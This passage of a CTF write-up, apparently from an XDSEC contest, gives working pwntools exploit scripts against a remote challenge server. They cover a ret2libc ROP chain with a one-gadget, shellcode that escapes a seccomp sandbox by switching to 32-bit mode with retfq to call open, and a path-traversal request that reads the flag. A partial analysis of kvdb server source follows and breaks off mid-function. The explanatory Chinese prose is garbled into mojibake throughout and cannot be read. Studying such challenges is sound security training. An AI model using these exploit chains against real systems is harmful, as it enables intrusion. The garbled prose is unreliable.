<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_LIBRARY_PATH&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;&#125;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x40142E</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Add new god:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Name: &quot;</span>,content.ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Do you know who is the God of XDSEC? (*^_^*)&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    edit(<span class="number">272</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">10</span>,p64(<span class="number">0x401236</span>))</span><br><span class="line">    pop_rdi=<span class="number">0x00000000004015d3</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>-<span class="number">1</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0x401236</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x0000000000034580</span>)+p64(libc_base+<span class="number">0xe3b34</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-shellcode"><a href="#pwn2-shellcode" class="headerlink" title="pwn2 shellcode"></a>pwn2 shellcode</h2><p>ä¸€é“æœ‰æ²™ç®±çš„shellcodeé¢˜ç›®ï¼Œåˆšå¼€å§‹é¢˜ç›®å‡ºçš„æœ‰é—®é¢˜ï¼Œæ²™ç®±æ²¡æœ‰ç¦ç”¨0x40000000,æ‰€ä»¥å¯ä»¥<code>0x40000000+ç³»ç»Ÿè°ƒç”¨å·</code>ç»•è¿‡æ²™ç®±ï¼Œæœ¬åœ°æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸€ç›´ä¸æˆåŠŸï¼Œå’Œå‡ºé¢˜äººåé¦ˆåè¯´æ˜¯é¢˜ç›®å‡ºé”™äº†ï¼Œæœ€åbanäº†0x40000000,ä½†æ˜¯æ²¡æœ‰banæ¶æ„ï¼Œæ²™ç›’å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/xidian/pwn5$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x05 0x00 0x40000000  if (A &gt; 0x40000000) goto 0007</span><br><span class="line"> 0002: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0007</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0007</span><br><span class="line"> 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>æœ¬è´¨ä¸Šä»–å…è®¸<code>1 5 0 9</code>è¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨å·ï¼Œåœ¨32ä½ä¸‹è°ƒç”¨å·5å¯¹åº”<code>open</code>ï¼Œè¿™æ ·orwå°±å‡‘é½äº†ï¼Œå…ˆåœ¨64ä¸‹åˆ©ç”¨mmapç”³è¯·32ä½åœ°å€çš„åœ°æ®µç©ºé—´ï¼Œç„¶åä½¿ç”¨<code>retfq</code>è½¬åˆ°32ä½ï¼Œè°ƒç”¨openåè°ƒç”¨<code>retfq</code>è¿”å›64ä½ï¼Œæ³¨æ„32ä½æ²¡æœ‰retfqè¿™ä¸ªæŒ‡ä»¤æ‰€ä»¥å¡«çš„æ˜¯64ä½çš„ï¼Œè¿˜æœ‰ç¬¬äºŒä¸ªretfqåé¢å¿…é¡»å¾—è¿˜æœ‰æŒ‡ä»¤æ‰èƒ½æ‰§è¡ŒæˆåŠŸï¼Œä¸ç„¶å°±ä¼šå‡ºé”™ï¼Œæœ€ååœ¨64ä½ä¸‹è°ƒç”¨rwå¾—åˆ°flag</p>
<p>åŸºæœ¬ä¸Šæ˜¯markä½¬æä¾›çš„æ€è·¯ã€‚è†œè†œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10057</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+0x13C2)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rax, 9</span></span><br><span class="line"><span class="string">    mov rdi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rsi, 0x100</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rcx, 34</span></span><br><span class="line"><span class="string">    mov r8, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov r9, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rsi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov esp, 0x70707a70</span></span><br><span class="line"><span class="string">    mov rax, 0x23</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push 0x70707077</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ebx, 0x70707070</span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov edx, 0</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode3=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x70707170</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode4=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi ,3</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pay=asm(shellcode1,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    pay=<span class="string">&#x27;./flag\x00&#x27;</span>+asm(shellcode2,arch=<span class="string">&#x27;i386&#x27;</span>)+asm(shellcode3,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(shellcode4,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3-easy-http"><a href="#pwn3-easy-http" class="headerlink" title="pwn3 easy_http"></a>pwn3 easy_http</h2><p>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ï¼Œå°±æ˜¯ç¦äº†/<code>home/minil/flag</code>ç›®å½•ï¼Œç»•è¿‡å°±è¡Œäº†ï¼Œæ¯”å¦‚<code>/home/../home/mimil/flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10021</span>)</span><br><span class="line">pay=<span class="string">&#x27;GET /home/minil/../minil/flag\r\n&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;User-Agent: MiniL\r\n\r\n&#x27;</span></span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4-kvdb"><a href="#pwn4-kvdb" class="headerlink" title="pwn4 kvdb"></a>pwn4 kvdb</h2><p>è¿™é“é¢˜çš„ä»£ç é‡æ˜¯æˆ‘åšè¿‡çš„é¢˜ä¸­æœ€å¤§çš„ï¼Œå½“æ—¶å®¡äº†ä¸€ä¼šå®åœ¨å®¡ä¸ä¸‹å»å°±æ”¾å¼ƒäº†ï¼Œåé¢å‡ºé¢˜äººé‰´äºéš¾åº¦å¤ªå¤§ç›´æ¥æ”¾äº†æºç ï¼Œæ‰åˆè·‘æ¥çœ‹è¿™é“é¢˜ï¼Œä¸€çœ‹æºç ï¼Œå¥½å®¶ä¼™åŠ èµ·æ¥ä¸€åƒå¤šè¡Œäº†ï¼Œå…‰å®¡æ˜ç™½ä»£ç å’Œæ‰¾è§æ¼æ´èŠ±äº†ä¸€ä¸ªæ™šä¸Šã€‚ğŸ¤¦â€â™€ï¸</p>
<h3 id="0x1-ç»“æ„ä½“åŠå…³ç³»"><a href="#0x1-ç»“æ„ä½“åŠå…³ç³»" class="headerlink" title="0x1 ç»“æ„ä½“åŠå…³ç³»"></a>0x1 ç»“æ„ä½“åŠå…³ç³»</h3><p>ç¨‹åºå®ç°çš„æ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆæœ¬çš„æ•°æ®åº“ï¼ŒæŠŠé‡Œé¢çš„ç»“æ„ä½“çš„å…³ç³»æŠ½è±¡å‡ºæ¥å°±æ˜¯å¦‚ä¸‹å›¾</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511135849068.png" alt="image-20220511135849068"></p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>data_t</code>ç»“æ„ä½“äº†,æœ¬è´¨ä¸Šä»–æœ‰ä¸¤ä¸ªæˆå‘˜ï¼Œä¸€ä¸ªæˆå‘˜æ˜¯<code>uint16 type</code>ï¼Œè®°å½•çš„æ˜¯è¿™ä¸ª<code>data_t</code>ç»“æ„ä½“æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œ0-&gt;empty,1-&gt;int,2-&gt;float,3-&gt;string,ç„¶åè¿˜æœ‰ä¸€ä¸ªunionå…±ç”¨é¢˜è®°å½•æˆå‘˜å…·ä½“çš„é‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 <span class="keyword">data_integer_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> <span class="keyword">data_float_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_string_t</span> &#123;</span></span><br><span class="line">    uint32 len;</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">&#125; <span class="keyword">data_string_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_array_t</span> &#123;</span></span><br><span class="line">    uint32 count;</span><br><span class="line">    <span class="keyword">data_t</span>** items;</span><br><span class="line">&#125; <span class="keyword">data_array_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    uint16 type;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">data_integer_t</span> integer;</span><br><span class="line">        <span class="keyword">data_float_t</span> _float;</span><br><span class="line">        <span class="keyword">data_string_t</span> str;</span><br><span class="line">        <span class="keyword">data_array_t</span> <span class="built_in">array</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">data_t</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç»“æ„ä½“æ˜¯0x18å¤§å°çš„ï¼Œæ‰€ä»¥ä¼šç”³è¯·0x10å¤§å°çš„å †ï¼Œç„¶åä¸‹ä¸€ä¸ªå †å¤´çš„å‰å…«ä¸ªå­—èŠ‚ä¹Ÿç»™è¿™ä¸ªå †ç”¨ã€‚</p>
<h3 id="0x2-å¤§è‡´é€»è¾‘"><a href="#0x2-å¤§è‡´é€»è¾‘" class="headerlink" title="0x2 å¤§è‡´é€»è¾‘"></a>0x2 å¤§è‡´é€»è¾‘</h3><p>ç¨‹åºæ˜¯åˆ©ç”¨socketå’Œç”¨æˆ·è¿›è¡Œäº¤äº’çš„ï¼Œç¨‹åºçš„å¯åŠ¨è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kvdb -p 9999 -m 32 -l /dev/null -t 10 -d</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ç¨‹åºå¯¹å‘½ä»¤è¡Œå‚æ•°çš„è§£æè¿‡ç¨‹,å…¶ä¸­<code>getopt</code>å‡½æ•°å°±æ˜¯æ¯æ¬¡å–ä¸€ä¸ªé€‰é¡¹ï¼Œç„¶åæŠŠé€‰é¡¹å¯¹åº”çš„å€¼å­˜åˆ°optargä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;p:m:t:l:hd&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">               socks_server_port = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">               max_requests = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">               timeout = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">               log_file = (<span class="keyword">char</span> *)optarg;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">               run_daemon = <span class="number">1</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span></span><br><span class="line">                   &lt;&lt; <span class="string">&quot;kvdb [-p &lt;port&gt;] [-m &lt;max_clients&gt;] [-t &lt;timeout sec&gt;] [-l &lt;log file&gt;] [-d]&quot;</span></span><br><span class="line">                   &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (<span class="string">&quot;HELP: -h&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è§£æå®Œæ¯•åå¯¹å˜é‡çš„èµ‹å€¼å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socks_server_port=<span class="number">9999</span></span><br><span class="line">max_requests=<span class="number">32</span></span><br><span class="line">timeout=<span class="number">10</span></span><br><span class="line">log_file=/dev/null</span><br><span class="line">run_daemon=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±è¿›å…¥äº†<code>init_daemon()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹åç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºå°±è„±ç¦»ç»ˆç«¯äº†ï¼Œç„¶åè¿›å…¥<code>server_loop()</code>å‡½æ•°åˆ›å»ºæœåŠ¡ç«¯socketï¼Œä¸€ç›´acceptç­‰å¾…è¿æ¥ï¼Œæœ‰è¿æ¥åå†forkä¸€ä¸ªå­è¿›ç¨‹è®©å­è¿›ç¨‹å¤„ç†è¯·æ±‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">server_loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">local_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;local_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new socket (only IPv4 is supported now) */</span></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): Can not create sock_fd!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* reuse addr */</span></span><br><span class="line">    <span class="keyword">int</span> new_optval = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;new_optval,</span><br><span class="line">                   <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): setsockopt()!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_addr.sin_family = AF_INET;</span><br><span class="line">    local_addr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// listen addr</span></span><br><span class="line">    local_addr.sin_port = htons(socks_server_port);  <span class="comment">// listen port</span></span><br><span class="line">    <span class="keyword">socklen_t</span> local_addr_len = <span class="keyword">sizeof</span>(local_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock_fd, (struct sockaddr*)&amp;local_addr, local_addr_len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): bind()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sock_fd, max_requests) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): listen()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] Listen on port %d.\n&quot;</span>, getpid(), socks_server_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> client_addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;client_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(client_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* loop */</span></span><br><span class="line">        <span class="keyword">if</span> 